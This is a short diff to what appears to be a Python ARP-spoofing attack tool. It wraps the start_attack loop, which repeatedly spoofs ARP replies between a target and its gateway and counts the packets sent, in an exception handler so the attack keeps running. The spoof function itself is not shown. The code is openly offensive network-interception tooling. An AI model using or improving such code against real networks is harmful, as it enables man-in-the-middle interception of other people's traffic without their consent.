@@ -37,13 +37,16 @@ def restore(destination_ip, source_ip):
 def start_attack(target_ip, gateway_ip, verbose=True):
     sent_packets_count = 0
     while True:
-        spoof(target_ip, gateway_ip)
-        spoof(gateway_ip, target_ip)
-        sent_packets_count += 2
-        # print on the same line at the beginning
-        if verbose:
-            print('\r[+] Packets sent: ' + str(sent_packets_count), end='')
-        time.sleep(2)
+        try:
+            spoof(target_ip, gateway_ip)
+            spoof(gateway_ip, target_ip)
+            sent_packets_count += 2
+            # print on the same line at the beginning
+            if verbose:
+                print('\r[+] Packets sent: ' + str(sent_packets_count), end='')
+            time.sleep(2)
+        except IndexError:
+            pass
 
 
 def stop_attack(target_ip, gateway_ip, verbose=True):
